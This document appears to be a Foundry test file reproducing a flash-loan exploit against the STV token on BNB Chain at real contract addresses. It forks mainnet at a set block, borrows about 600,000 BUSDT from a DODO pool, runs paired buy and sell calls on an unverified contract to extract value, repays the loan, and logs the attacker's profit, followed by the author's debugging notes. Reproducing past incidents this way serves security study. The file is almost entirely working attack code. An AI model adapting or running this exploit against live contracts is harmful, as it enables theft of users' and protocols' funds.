// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../InterfaceGlobal.sol";

interface IUnknown {
    function buy(uint bscusd) external;
     function sell(uint stv) external;
}

contract STVExploit is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 STV = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281);
    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IUnknown unknownContract = IUnknown(0x2120F8F305347b6aA5E5dBB347230a8234EB3379);

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 31178237);
    }

    function testSTVExploit() external {
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint("Attacker BUSDT start balance", BUSDT.balanceOf(address(this)), 18);
        DPPOracle.flashLoan(0, 600296101490916296932929, address(this), "0x00");
        emit log_named_decimal_uint("Attacker BUSDT end balance", BUSDT.balanceOf(address(this)), 18);

    }

    function DPPFlashLoanCall(address sender, uint baseAmt, uint quoteAmt, bytes calldata data) public{
        uint halfQuoteAmt = quoteAmt/2;
        STV.approve(address(unknownContract), type(uint).max);
        BUSDT.approve(address(unknownContract), type(uint).max);
        unknownContract.buy(halfQuoteAmt);
        unknownContract.buy(halfQuoteAmt);
         unknownContract.sell(1502483458493195656785812);
          unknownContract.sell(3375520392347497456166643);
        BUSDT.transfer(address(DPPOracle), quoteAmt);
    }
}

/*
Errors:

1. Forgot to put sell in the interface
2. Apparently theres an approve needed. UnknownContract is a Pool ? [FAIL. Reason: BEP20: transfer amount exceeds allowance] means no approve
*/ 